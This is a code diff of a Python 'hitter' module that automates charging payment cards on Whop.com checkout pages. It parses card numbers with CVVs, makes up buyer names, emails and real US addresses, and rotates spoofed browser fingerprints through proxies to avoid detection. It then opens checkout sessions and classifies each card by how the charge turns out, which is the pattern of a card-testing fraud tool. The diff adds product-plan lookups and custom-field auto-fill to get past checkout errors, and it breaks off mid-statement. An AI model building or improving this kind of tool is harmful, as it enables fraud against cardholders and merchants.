@@ -6,9 +6,14 @@ Automated checkout & charge engine for Whop.com membership & product pages.
 Features:
 - curl_cffi AsyncSession with real browser TLS fingerprint emulation (impersonate="chrome131", "chrome133")
 - Full realistic device profile rotation (User-Agent, sec-ch-ua, screen dimensions, WebGL vendor/renderer, timezones)
-- Next.js RSC & structured JSON product plan resolution (avoiding $0.00 free tiers)
-- Checkout configuration (ch_...) resolution via the public Whop API
-- Custom-field auto-fill (prevents "Custom field response not included in array" errors)
+- Plan resolution via 4 priorities:
+    P1. plan_ ID in URL
+    P2. ch_ checkout config in URL → resolved via /checkout_configurations API
+    P3. product route in URL (e.g. /pluginn/pluginn/) → resolved via /products/{route} API
+    P4. HTML / RSC scraping fallback
+- Plan custom_fields fetched from /plans/{plan_id} API and auto-filled into
+  the checkout session as `custom_field_responses` (prevents the
+  "Custom field response not included in array" error)
 - Containerized Basis Theory card tokenization with Whop merchant container exchange
 - Strict charge classification (zero false positives, real gateway decline extraction)
 """
@@ -40,12 +45,8 @@ DEVICE_PROFILES = [
         "uaPlatform": "Windows",
         "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_platform": '"Windows"',
-        "width": 1920,
-        "height": 1080,
-        "depth": 24,
-        "tz": -240,
-        "hardwareConcurrency": 8,
-        "deviceMemoryGb": 8,
+        "width": 1920, "height": 1080, "depth": 24, "tz": -240,
+        "hardwareConcurrency": 8, "deviceMemoryGb": 8,
         "uaBrands": [{"brand": "Google Chrome", "version": "131"}, {"brand": "Chromium", "version": "131"}, {"brand": "Not_A Brand", "version": "24"}],
         "webglVendor": "Google Inc. (Intel)",
         "webglRenderer": "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)"
@@ -53,16 +54,11 @@ DEVICE_PROFILES = [
     {
         "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
         "impersonate": "chrome131",
-        "platform": "Win32",
-        "uaPlatform": "Windows",
+        "platform": "Win32", "uaPlatform": "Windows",
         "sec_ch_ua": '"Not A(Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
         "sec_platform": '"Windows"',
-        "width": 1536,
-        "height": 864,
-        "depth": 24,
-        "tz": -300,
-        "hardwareConcurrency": 12,
-        "deviceMemoryGb": 16,
+        "width": 1536, "height": 864, "depth": 24, "tz": -300,
+        "hardwareConcurrency": 12, "deviceMemoryGb": 16,
         "uaBrands": [{"brand": "Not A(Brand", "version": "8"}, {"brand": "Chromium", "version": "131"}, {"brand": "Google Chrome", "version": "131"}],
         "webglVendor": "Google Inc. (NVIDIA)",
         "webglRenderer": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)"
@@ -70,33 +66,22 @@ DEVICE_PROFILES = [
     {
         "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
         "impersonate": "chrome131",
-        "platform": "MacIntel",
-        "uaPlatform": "macOS",
+        "platform": "MacIntel", "uaPlatform": "macOS",
         "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_platform": '"macOS"',
-        "width": 1440,
-        "height": 900,
-        "depth": 30,
-        "tz": -420,
-        "hardwareConcurrency": 8,
-        "deviceMemoryGb": 16,
+        "width": 1440, "height": 900, "depth": 30, "tz": -420,
+        "hardwareConcurrency": 8, "deviceMemoryGb": 16,
         "uaBrands": [{"brand": "Google Chrome", "version": "131"}, {"brand": "Chromium", "version": "131"}, {"brand": "Not_A Brand", "version": "24"}],
-        "webglVendor": "Apple Inc.",
-        "webglRenderer": "Apple M1"
+        "webglVendor": "Apple Inc.", "webglRenderer": "Apple M1"
     },
     {
         "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
         "impersonate": "chrome131",
-        "platform": "Win32",
-        "uaPlatform": "Windows",
+        "platform": "Win32", "uaPlatform": "Windows",
         "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_platform": '"Windows"',
-        "width": 2560,
-        "height": 1440,
-        "depth": 24,
-        "tz": -300,
-        "hardwareConcurrency": 16,
-        "deviceMemoryGb": 32,
+        "width": 2560, "height": 1440, "depth": 24, "tz": -300,
+        "hardwareConcurrency": 16, "deviceMemoryGb": 32,
         "uaBrands": [{"brand": "Google Chrome", "version": "131"}, {"brand": "Chromium", "version": "131"}, {"brand": "Not_A Brand", "version": "24"}],
         "webglVendor": "Google Inc. (AMD)",
         "webglRenderer": "ANGLE (AMD, AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"
@@ -104,54 +89,23 @@ DEVICE_PROFILES = [
     {
         "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
         "impersonate": "chrome131",
-        "platform": "MacIntel",
-        "uaPlatform": "macOS",
+        "platform": "MacIntel", "uaPlatform": "macOS",
         "sec_ch_ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
         "sec_platform": '"macOS"',
-        "width": 1680,
-        "height": 1050,
-        "depth": 30,
-        "tz": -480,
-        "hardwareConcurrency": 10,
-        "deviceMemoryGb": 16,
+        "width": 1680, "height": 1050, "depth": 30, "tz": -480,
+        "hardwareConcurrency": 10, "deviceMemoryGb": 16,
         "uaBrands": [{"brand": "Not A(Brand", "version": "8"}, {"brand": "Chromium", "version": "132"}, {"brand": "Google Chrome", "version": "132"}],
-        "webglVendor": "Apple Inc.",
-        "webglRenderer": "Apple M2"
+        "webglVendor": "Apple Inc.", "webglRenderer": "Apple M2"
     }
 ]
 
-TEMPMAIL_BRIDGE_URLS = [
-    "http://127.0.0.1:8443",
-    "http://2.24.107.198:8443",
-]
+TEMPMAIL_BRIDGE_URLS = ["http://127.0.0.1:8443", "http://2.24.107.198:8443"]
 
-DOMAINS = [
-    "darkanons.tech",
-    "darkanon.eu.cc",
-    "darkanons.com",
-    "darkanon.live",
-    "darkanon.store",
-    "thetechmens.com",
-    "themain.pro"
-]
+DOMAINS = ["darkanons.tech","darkanon.eu.cc","darkanons.com","darkanon.live","darkanon.store","thetechmens.com","themain.pro"]
 
-FIRST_NAMES = [
-    "Alex", "Aiden", "Andrew", "Anthony", "Austin", "Ben", "Brandon", "Brian", "Caleb", "Cameron",
-    "Chris", "Christian", "Cole", "Colin", "Connor", "Daniel", "David", "Derek", "Dylan", "Eli",
-    "Elijah", "Eric", "Ethan", "Evan", "Gabriel", "Hunter", "Ian", "Isaac", "Jack", "Jackson",
-    "Jacob", "James", "Jason", "Jordan", "Joseph", "Joshua", "Justin", "Kevin", "Kyle", "Liam",
-    "Logan", "Lucas", "Luke", "Mason", "Matthew", "Max", "Michael", "Nathan", "Nicholas", "Noah",
-    "Oliver", "Owen", "Parker", "Ryan", "Sam", "Samuel", "Sean", "Tyler", "William", "Zachary",
-    "Marcus", "Miles", "Arthur", "Carter", "Chase", "Dean", "George", "Julian", "Reed"
-]
+FIRST_NAMES = ["Alex","Aiden","Andrew","Anthony","Austin","Ben","Brandon","Brian","Caleb","Cameron","Chris","Christian","Cole","Colin","Connor","Daniel","David","Derek","Dylan","Eli","Elijah","Eric","Ethan","Evan","Gabriel","Hunter","Ian","Isaac","Jack","Jackson","Jacob","James","Jason","Jordan","Joseph","Joshua","Justin","Kevin","Kyle","Liam","Logan","Lucas","Luke","Mason","Matthew","Max","Michael","Nathan","Nicholas","Noah","Oliver","Owen","Parker","Ryan","Sam","Samuel","Sean","Tyler","William","Zachary","Marcus","Miles","Arthur","Carter","Chase","Dean","George","Julian","Reed"]
 
-LAST_NAMES = [
-    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
-    "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
-    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
-    "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
-    "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Reed", "Cooper", "Morgan"
-]
+LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Reed","Cooper","Morgan"]
 
 REAL_US_ADDRESSES = [
     {"line1": "1201 N Market St", "city": "Wilmington", "state": "DE", "postalCode": "19801"},
@@ -186,7 +140,7 @@ def format_proxy(raw: Optional[str]) -> Optional[str]:
 
 
 # ═══════════════════════════════════════════════════════════════
-# CHECKOUT CONFIG RESOLVER (ch_... → plan_...)
+# PUBLIC WHOP API HELPERS
 # ═══════════════════════════════════════════════════════════════
 
 async def _resolve_checkout_config_to_plan(
@@ -194,18 +148,9 @@ async def _resolve_checkout_config_to_plan(
     checkout_config_id: str,
     headers: Dict[str, str],
 ) -> Optional[str]:
-    """
-    Given a `ch_...` checkout configuration ID, call the public Whop API
-    to retrieve the underlying `plan_...` ID.
-
-    Endpoint: GET https://api.whop.com/api/v1/checkout_configurations/{id}
-    This endpoint is public (no auth) so checkout pages can load.
-
-    Returns None on failure.
-    """
+    """ch_... → plan_... via the public checkout_configurations API."""
     if not checkout_config_id or not checkout_config_id.startswith("ch_"):
         return None
-
     try:
         api_headers = {
             "user-agent": headers.get("user-agent", "Mozilla/5.0"),
@@ -215,121 +160,209 @@ async def _resolve_checkout_config_to_plan(
         }
         r = await client.get(
             f"https://api.whop.com/api/v1/checkout_configurations/{checkout_config_id}",
-            headers=api_headers,
-            timeout=15,
+            headers=api_headers, timeout=15,
         )
         if r.status_code == 200:
-            try:
-                data = r.json()
-            except Exception:
-                logger.warning(f"[whop_hitter] non-JSON response from checkout_configurations API for {checkout_config_id}")
-                return None
-
-            # Primary shape: {"plan": {"id": "plan_..."}}
+            data = r.json()
             plan = data.get("plan") or {}
             pid = plan.get("id") if isinstance(plan, dict) else None
-
-            # Fallback shapes sometimes seen
             if not pid:
                 pid = data.get("plan_id") or data.get("planId")
-            if not pid and isinstance(data.get("plan"), str):
-                pid = data["plan"]
-
             if pid and isinstance(pid, str) and pid.startswith("plan_"):
                 logger.info(f"[whop_hitter] resolved {checkout_config_id} -> {pid}")
                 return pid
-
-            logger.warning(
-                f"[whop_hitter] checkout_configurations response for {checkout_config_id} "
-                f"did not include a usable plan_ id (keys: {list(data.keys())})"
-            )
-            return None
-
-        logger.warning(
-            f"[whop_hitter] checkout_configurations API returned HTTP {r.status_code} "
-            f"for {checkout_config_id}: {r.text[:120]}"
-        )
     except Exception as e:
-        logger.warning(f"[whop_hitter] failed to resolve checkout config {checkout_config_id}: {e}")
+        logger.warning(f"[whop_hitter] checkout_config resolution failed for {checkout_config_id}: {e}")
+    return None
+
+
+async def _resolve_product_route_to_plan(
+    client: AsyncSession,
+    product_route: str,
+    headers: Dict[str, str],
+) -> Optional[str]:
+    """
+    Product route slug (e.g. 'pluginn') → plan_... via the public products API.
+
+    Flow:
+      1. GET /products/{route}   → returns product with default_plan.id
+      2. If default_plan.id present, use it.
+      3. Otherwise GET /plans?product_ids=prod_xxx → pick first visible/renewal plan.
+    """
+    if not product_route:
+        return None
+
+    api_headers = {
+        "user-agent": headers.get("user-agent", "Mozilla/5.0"),
+        "accept": "application/json",
+        "origin": "https://whop.com",
+        "referer": "https://whop.com/",
+    }
+
+    product_id = None
+
+    try:
+        r = await client.get(
+            f"https://api.whop.com/api/v1/products/{product_route}",
+            headers=api_headers, timeout=15,
+        )
+        if r.status_code == 200:
+            data = r.json()
+            product_id = data.get("id")
+            default_plan = data.get("default_plan") or {}
+            dp_id = default_plan.get("id") if isinstance(default_plan, dict) else None
+            if dp_id and isinstance(dp_id, str) and dp_id.startswith("plan_"):
+                logger.info(
+                    f"[whop_hitter] resolved product route '{product_route}' "
+                    f"(prod={product_id}) -> default plan {dp_id}"
+                )
+                return dp_id
+    except Exception as e:
+        logger.warning(f"[whop_hitter] products/{product_route} lookup failed: {e}")
+
+    # Fallback — list plans for the product
+    if product_id:
+        try:
+            r2 = await client.get(
+                f"https://api.whop.com/api/v1/plans?product_ids={product_id}&first=20",
+                headers=api_headers, timeout=15,
+            )
+            if r2.status_code == 200:
+                plans = (r2.json() or {}).get("data") or []
+                # Prefer renewal + visible + non-zero price
+                for p in plans:
+                    if (p.get("plan_type") == "renewal"
+                            and p.get("visibility") == "visible"
+                            and float(p.get("renewal_price") or 0) > 0):
+                        pid = p.get("id")
+                        if pid and pid.startswith("plan_"):
+                            logger.info(
+                                f"[whop_hitter] resolved product route '{product_route}' "
+                                f"(prod={product_id}) -> renewal plan {pid}"
+                            )
+                            return pid
+                # Fallback to any visible plan
+                for p in plans:
+                    if p.get("visibility") == "visible":
+                        pid = p.get("id")
+                        if pid and pid.startswith("plan_"):
+                            logger.info(
+                                f"[whop_hitter] resolved product route '{product_route}' "
+                                f"(prod={product_id}) -> visible plan {pid}"
+                            )
+                            return pid
+        except Exception as e:
+            logger.warning(f"[whop_hitter] plans listing failed for prod {product_id}: {e}")
 
     return None
 
 
+async def _fetch_plan_custom_fields(
+    client: AsyncSession,
+    plan_id: str,
+    headers: Dict[str, str],
+) -> List[Dict[str, Any]]:
+    """
+    Fetch the plan's custom_fields array from the public plans API.
+    Returns [] if the plan has none, or the lookup fails.
+    """
+    if not plan_id or not plan_id.startswith("plan_"):
+        return []
+    try:
+        api_headers = {
+            "user-agent": headers.get("user-agent", "Mozilla/5.0"),
+            "accept": "application/json",
+            "origin": "https://whop.com",
+            "referer": "https://whop.com/",
+        }
+        r = await client.get(
+            f"https://api.whop.com/api/v1/plans/{plan_id}",
+            headers=api_headers, timeout=15,
+        )
+        if r.status_code == 200:
+            data = r.json() or {}
+            cf = data.get("custom_fields") or []
+            if isinstance(cf, list) and cf:
+                normalized = []
+                for f in cf:
+                    if not isinstance(f, dict):
+                        continue
+                    fid = f.get("id")
+                    if not fid:
+                        continue
+                    normalized.append({
+                        "id": fid,
+                        "name": f.get("name") or "",
+                        "field_type": (f.get("field_type") or "text").lower(),
+                        "required": bool(f.get("required", False)),
+                        "placeholder": f.get("placeholder") or "",
+                    })
+                logger.info(
+                    f"[whop_hitter] fetched {len(normalized)} custom field(s) "
+                    f"for {plan_id}: {[n['name'] for n in normalized]}"
+                )
+                return normalized
+            else:
+                logger.info(f"[whop_hitter] plan {plan_id} has no custom_fields")
+                return []
+        else:
+            logger.warning(
+                f"[whop_hitter] plans/{plan_id} returned HTTP {r.status_code}"
+            )
+    except Exception as e:
+        logger.warning(f"[whop_hitter] plan custom_fields fetch failed for {plan_id}: {e}")
+    return []
+
+
 # ═══════════════════════════════════════════════════════════════
-# CUSTOM FIELD EXTRACTION & AUTO-FILL
+# CUSTOM FIELD AUTO-FILL
 # ═══════════════════════════════════════════════════════════════
 
 def _extract_custom_fields_from_html(page_html: str, plan_id: str) -> List[Dict[str, Any]]:
-    """
-    Best-effort extraction of the plan's custom field definitions from the
-    Next.js RSC payload. Looks in a window around the plan_id for a
-    `customFields` / `custom_fields` array.
-
-    Returns a list of dicts:
-        [{"id": "field_xxx", "name": "...", "field_type": "text", "required": True}, ...]
-    Returns [] if nothing is found (plan has no custom fields).
-    """
+    """Legacy HTML-based extraction (kept as a fallback)."""
     fields: List[Dict[str, Any]] = []
     try:
         if not page_html or not plan_id:
             return fields
-
         idx = page_html.find(plan_id)
         if idx == -1:
             return fields
-
-        # Search a generous window around the plan id
         window = page_html[max(0, idx - 4000): idx + 6000]
-
-        # Find the customFields array inside that window (multiple key styles)
         cf_match = (
             re.search(r'customFields\s*:\s*\[(.*?)\]\s*[,}]', window, re.DOTALL)
             or re.search(r'custom_fields\s*:\s*\[(.*?)\]\s*[,}]', window, re.DOTALL)
-            or re.search(r'"customFields"\s*:\s*\[(.*?)\]\s*[,}]', window, re.DOTALL)
-            or re.search(r'"custom_fields"\s*:\s*\[(.*?)\]\s*[,}]', window, re.DOTALL)
         )
         if not cf_match:
             return fields
-
         body = cf_match.group(1)
-
-        # Each field object — tolerate nested-free flat objects
         for obj in re.findall(r'\{[^{}]*\}', body):
             f_id = re.search(r'(?:id|field_id|fieldId)\s*:\s*"([^"]+)"', obj)
             if not f_id:
                 continue
-
             f_name = re.search(r'(?:name|label|title)\s*:\s*"([^"]*)"', obj)
             f_type = re.search(r'(?:field_type|fieldType|type)\s*:\s*"([^"]+)"', obj)
             f_req = re.search(r'required\s*:\s*(!0|true|!1|false)', obj)
-
-            required_val = True
-            if f_req:
-                required_val = f_req.group(1) in ("!0", "true")
-
+            required_val = True if not f_req else f_req.group(1) in ("!0", "true")
             fields.append({
                 "id": f_id.group(1),
                 "name": f_name.group(1) if f_name else "",
                 "field_type": (f_type.group(1) if f_type else "text").lower(),
                 "required": required_val,
+                "placeholder": "",
             })
     except Exception as e:
-        logger.warning(f"[whop_hitter] custom field extraction failed: {e}")
-
+        logger.warning(f"[whop_hitter] custom field HTML extraction failed: {e}")
     return fields
 
 
 def _build_custom_field_responses(fields: List[Dict[str, Any]]) -> List[Dict[str, str]]:
-    """
-    Produce a valid 'custom_field_responses' array for the checkout payload.
-    Every field gets a sensible dummy answer depending on its type.
-    """
+    """Produce a valid `custom_field_responses` array for the checkout payload."""
     responses: List[Dict[str, str]] = []
     for f in fields:
         ftype = (f.get("field_type") or "text").lower()
         name_lower = (f.get("name") or "").lower()
+        placeholder = (f.get("placeholder") or "").strip()
 
-        # Smart-ish defaults based on field name
         if "discord" in name_lower:
             answer = "user#0001"
         elif "email" in name_lower:
@@ -341,9 +374,8 @@ def _build_custom_field_responses(fields: List[Dict[str, Any]]) -> List[Dict[str
         elif "age" in name_lower or "number" in name_lower or "quantity" in name_lower:
             answer = "1"
         else:
-            # Type-based fallback
             if ftype in ("text", "textarea", "string", "short_text", "long_text"):
-                answer = "N/A"
+                answer = placeholder or "N/A"
             elif ftype in ("number", "numeric", "integer", "int"):
                 answer = "1"
             elif ftype in ("email",):
@@ -353,19 +385,13 @@ def _build_custom_field_responses(fields: List[Dict[str, Any]]) -> List[Dict[str
             elif ftype in ("checkbox", "boolean", "bool", "toggle"):
                 answer = "true"
             elif ftype in ("dropdown", "select", "choice", "radio", "multi_select"):
-                # Free-text fallback — will work on free-form dropdowns,
-                # may be rejected on strict ones (that's expected).
-                answer = "N/A"
+                answer = placeholder or "N/A"
             elif ftype in ("date",):
                 answer = "2000-01-01"
             else:
-                answer = "N/A"
+                answer = placeholder or "N/A"
 
-        responses.append({
-            "id": f["id"],
-            "answer": answer,
-        })
-
+        responses.append({"id": f["id"], "answer": answer})
     return responses
 
 
@@ -373,7 +399,6 @@ async def get_tempmail_address() -> Tuple[str, str]:
     first = random.choice(FIRST_NAMES)
     last = random.choice(LAST_NAMES)
     full_name = f"{first} {last}"
-
     for base_url in TEMPMAIL_BRIDGE_URLS:
         try:
             async with httpx.AsyncClient(timeout=3) as client:
@@ -385,7 +410,6 @@ async def get_tempmail_address() -> Tuple[str, str]:
                         return full_name, email
         except Exception:
             continue
-
     domain = random.choice(DOMAINS)
     email = f"{first.lower()}.{last.lower()}{random.randint(10, 99)}@{domain}".lower()
     return full_name, email
@@ -402,19 +426,13 @@ class WhopHitter:
 
         parts = card.split("|")
         if len(parts) != 4:
-            return {
-                "Response": "INVALID_FORMAT",
-                "Status": "DECLINED",
-                "Message": "Invalid card format (expected CC|MM|YY|CVV)",
-                "Time": f"{time.time() - start_time:.2f}s"
-            }
+            return {"Response": "INVALID_FORMAT", "Status": "DECLINED",
+                    "Message": "Invalid card format (expected CC|MM|YY|CVV)",
+                    "Time": f"{time.time() - start_time:.2f}s"}
 
         cc, mm, yy, cv = parts
         mm = int(mm)
-        if len(yy) == 2:
-            yy = int("20" + yy)
-        else:
-            yy = int(yy)
+        yy = int("20" + yy) if len(yy) == 2 else int(yy)
 
         full_name, auto_email = await get_tempmail_address()
         if not email or email.strip().lower() in ["auto", "rand", "random", "none"]:
@@ -425,12 +443,9 @@ class WhopHitter:
         addr_template = random.choice(REAL_US_ADDRESSES)
         billing_addr = {
             "name": full_name,
-            "line1": addr_template["line1"],
-            "line2": "",
-            "city": addr_template["city"],
-            "state": addr_template["state"],
-            "postal_code": addr_template["postalCode"],
-            "country": "US"
+            "line1": addr_template["line1"], "line2": "",
+            "city": addr_template["city"], "state": addr_template["state"],
+            "postal_code": addr_template["postalCode"], "country": "US"
         }
 
         parsed_url = urlparse(url)
@@ -441,136 +456,113 @@ class WhopHitter:
         impersonate_target = profile.get("impersonate", "chrome131")
 
         headers_common = {
-            "user-agent": profile["ua"],
-            "accept": "*/*",
+            "user-agent": profile["ua"], "accept": "*/*",
             "accept-language": "en-US,en;q=0.9",
-            "origin": "https://whop.com",
-            "referer": url,
+            "origin": "https://whop.com", "referer": url,
             "whop-private-schema": "true",
-            "sec-ch-ua": profile["sec_ch_ua"],
-            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua": profile["sec_ch_ua"], "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": profile["sec_platform"],
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-origin",
         }
 
         async with AsyncSession(impersonate=impersonate_target, proxy=self.proxy, verify=False, timeout=30) as client:
             plan_id = None
-            page_html = ""   # hoisted so it's always defined
+            page_html = ""
 
-            # ─────────────────────────────────────────────────────────
-            # PRIORITY 1 — plan_ ID directly in URL
-            # ─────────────────────────────────────────────────────────
+            # ── P1: plan_ ID directly in URL ──
             url_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', url)
             if url_plans:
                 plan_id = url_plans[0]
 
-            # ─────────────────────────────────────────────────────────
-            # PRIORITY 2 — ch_ checkout configuration → resolve via API
-            # ─────────────────────────────────────────────────────────
+            # ── P2: ch_ checkout config → API ──
             if not plan_id:
                 ch_match = re.search(r'\bch_[a-zA-Z0-9]{12,20}\b', url)
                 if ch_match:
                     resolved = await _resolve_checkout_config_to_plan(
-                        client, ch_match.group(0), headers_common
-                    )
+                        client, ch_match.group(0), headers_common)
                     if resolved:
                         plan_id = resolved
 
-            # ─────────────────────────────────────────────────────────
-            # PRIORITY 3 — scrape the product page HTML / RSC
-            # ─────────────────────────────────────────────────────────
+            # ── P3: product route (e.g. /pluginn/pluginn/) → API ──
+            if not plan_id:
+                path_parts = [p for p in parsed_url.path.strip("/").split("/") if p]
+                # whop.com/{company_route}/{product_route}/ → last segment is the product route
+                product_route = path_parts[-1] if path_parts else ""
+                if product_route and not product_route.startswith(("plan_", "ch_", "prod_")):
+                    resolved = await _resolve_product_route_to_plan(
+                        client, product_route, headers_common)
+                    if resolved:
+                        plan_id = resolved
+
+            # ── P4: HTML / RSC scraping fallback ──
             if not plan_id:
                 try:
                     r_page = await client.get(url, headers={"user-agent": profile["ua"]})
                     page_html = r_page.text
-
-                    # Parse structured plan definitions with free indicator
                     pattern = r'\{id:"(plan_[a-zA-Z0-9]{12,18})",free:(!0|!1)(?:,[^}]+?formattedPeriodV2:"([^"]+)")?'
                     matches = re.findall(pattern, page_html)
-
                     parsed_plans = []
                     seen_pids = set()
                     for pid, free_val, period in matches:
                         if pid not in seen_pids:
                             seen_pids.add(pid)
                             parsed_plans.append({
-                                "id": pid,
-                                "free": free_val == "!0",
+                                "id": pid, "free": free_val == "!0",
                                 "period": (period or "").lower()
                             })
-
                     slug = parsed_url.path.rstrip("/").split("/")[-1].lower()
-
                     if "month" in slug:
                         for p in parsed_plans:
                             if not p["free"] and "month" in p["period"]:
-                                plan_id = p["id"]
-                                break
+                                plan_id = p["id"]; break
                     elif "year" in slug or "annual" in slug:
                         for p in parsed_plans:
                             if not p["free"] and "year" in p["period"]:
-                                plan_id = p["id"]
-                                break
-
+                                plan_id = p["id"]; break
                     if not plan_id:
                         paid = [p["id"] for p in parsed_plans if not p["free"]]
                         if paid:
                             plan_id = paid[0]
-
                     if not plan_id:
                         html_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', page_html)
                         if html_plans:
                             plan_id = html_plans[0]
                         else:
-                            r_rsc = await client.get(
-                                url,
-                                headers={
-                                    "user-agent": profile["ua"],
-                                    "RSC": "1",
-                                    "accept": "text/x-component",
-                                },
-                            )
+                            r_rsc = await client.get(url, headers={
+                                "user-agent": profile["ua"], "RSC": "1",
+                                "accept": "text/x-component"})
                             rsc_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', r_rsc.text)
                             if rsc_plans:
                                 plan_id = rsc_plans[0]
                                 page_html = r_rsc.text
                 except Exception as e:
-                    return {
-                        "Response": "PAGE_ERROR",
-                        "Status": "DECLINED",
-                        "CC": card,
-                        "Email": buyer_email,
-                        "Plan": "N/A",
-                        "Message": f"Failed to load product page: {str(e)}",
-                        "Time": f"{time.time() - start_time:.2f}s"
-                    }
+                    return {"Response": "PAGE_ERROR", "Status": "DECLINED",
+                            "CC": card, "Email": buyer_email, "Plan": "N/A",
+                            "Message": f"Failed to load product page: {str(e)}",
+                            "Time": f"{time.time() - start_time:.2f}s"}
 
             if not plan_id:
-                return {
-                    "Response": "NO_PLAN_FOUND",
-                    "Status": "DECLINED",
-                    "CC": card,
-                    "Email": buyer_email,
-                    "Plan": "N/A",
-                    "Message": "Could not extract plan_id from Whop link",
-                    "Time": f"{time.time() - start_time:.2f}s"
-                }
+                return {"Response": "NO_PLAN_FOUND", "Status": "DECLINED",
+                        "CC": card, "Email": buyer_email, "Plan": "N/A",
+                        "Message": "Could not extract plan_id from Whop link",
+                        "Time": f"{time.time() - start_time:.2f}s"}
 
             prod_slug = parsed_url.path.strip("/").split("/")[0] if parsed_url.path.strip("/") else ""
 
-            # ─────────────────────────────────────────────────────────
-            # AUTO-FILL CUSTOM FIELDS
-            # Prevents the "Custom field response not included in array"
-            # error by injecting `custom_field_responses` when the plan
-            # declares any custom fields.
-            # ─────────────────────────────────────────────────────────
+            # ═══════════════════════════════════════════════════════════
+            # FETCH PLAN CUSTOM FIELDS — via public plans API (authoritative)
+            # Falls back to HTML extraction if API lookup fails.
+            # ═══════════════════════════════════════════════════════════
             custom_field_defs: List[Dict[str, Any]] = []
             try:
-                custom_field_defs = _extract_custom_fields_from_html(page_html, plan_id)
+                custom_field_defs = await _fetch_plan_custom_fields(
+                    client, plan_id, headers_common)
             except Exception as e:
-                logger.warning(f"[whop_hitter] custom field extraction error: {e}")
+                logger.warning(f"[whop_hitter] plan custom_fields API fetch error: {e}")
+
+            if not custom_field_defs and page_html:
+                custom_field_defs = _extract_custom_fields_from_html(page_html, plan_id)
 
             checkout_payload: Dict[str, Any] = {
                 "items": [{"plan": plan_id, "quantity": 1}],
@@ -583,14 +575,13 @@ class WhopHitter:
                     checkout_payload["custom_field_responses"] = responses
                     logger.info(
                         f"[whop_hitter] injected {len(responses)} custom_field_responses "
-                        f"for plan {plan_id} "
+                        f"for {plan_id} "
                         f"({[f['name'] for f in custom_field_defs]})"
                     )
             else:
-                # Always send an empty array so Whop has the key present.
-                # Harmless for plans without custom fields; satisfies
-                # endpoints that require the key to exist.
+                # Always include the key so Whop never complains about a missing array.
                 checkout_payload["custom_field_responses"] = []
+                logger.info(f"[whop_hitter] no custom fields for {plan_id} — sending empty array")
 
             if affiliate_code:
                 checkout_payload["affiliate_code"] = affiliate_code
@@ -600,196 +591,136 @@ class WhopHitter:
                     "by_product": {prod_slug: affiliate_code} if prod_slug else {}
                 }
 
+            # ═══════════════════════════════════════════════════════════
+            # CHECKOUT SESSION
+            # ═══════════════════════════════════════════════════════════
             try:
                 r_sess = await client.post(
                     "https://whop.com/api/v1/checkout_sessions",
                     headers={**headers_common, "content-type": "application/json"},
-                    json=checkout_payload
-                )
+                    json=checkout_payload)
                 if r_sess.status_code not in (200, 201):
-                    err_txt = r_sess.text[:150]
-                    return {
-                        "Response": "CHECKOUT_INIT_FAILED",
-                        "Status": "DECLINED",
-                        "CC": card,
-                        "Email": buyer_email,
-                        "Plan": plan_id,
-                        "Message": f"Checkout init failed (HTTP {r_sess.status_code}): {err_txt}",
-                        "Time": f"{time.time() - start_time:.2f}s"
-                    }
+                    err_txt = r_sess.text[:200]
+                    return {"Response": "CHECKOUT_INIT_FAILED", "Status": "DECLINED",
+                            "CC": card, "Email": buyer_email, "Plan": plan_id,
+                            "Message": f"Checkout init failed (HTTP {r_sess.status_code}): {err_txt}",
+                            "Time": f"{time.time() - start_time:.2f}s"}
                 sess_data = r_sess.json()
                 checkout_id = sess_data.get("id")
                 client_secret = sess_data.get("client_secret")
                 account_id = sess_data.get("seller", {}).get("id")
 
-                # Prime breakdown with affiliate attribution
                 try:
                     await client.post(
                         f"https://whop.com/api/v1/checkout_sessions/{checkout_id}/calculate_breakdown",
                         headers={**headers_common, "content-type": "application/json"},
-                        json={"client_secret": client_secret, "supports_buyer_fee": True}
-                    )
+                        json={"client_secret": client_secret, "supports_buyer_fee": True})
                 except Exception:
                     pass
             except Exception as e:
-                return {
